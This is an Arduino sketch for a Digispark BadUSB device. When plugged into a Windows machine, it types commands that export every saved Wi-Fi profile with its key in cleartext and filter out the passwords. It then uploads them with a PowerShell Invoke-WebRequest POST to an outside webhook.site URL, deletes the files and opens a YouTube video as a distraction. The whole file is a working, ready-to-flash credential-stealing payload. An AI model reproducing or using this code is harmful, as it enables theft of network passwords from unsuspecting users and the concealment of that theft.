
#include "DigiKeyboard.h"

void winRun(const char* command){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT  ); // press the windows key
  DigiKeyboard.delay(100); // wait a second
  DigiKeyboard.println(command);
}

void stealPasswords(){
  winRun("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%"); //Jumping to temporary dir
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/b4551bf8-8100-4ab7-9dfa-40276a3e01e2/wifi -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);  
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
}
void setup() {
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  
  stealPasswords();
  
  winRun("https://www.youtube.com/watch?v=mGAsSTeeG6M");  
}

void loop() {
  DigiKeyboard.update();
}
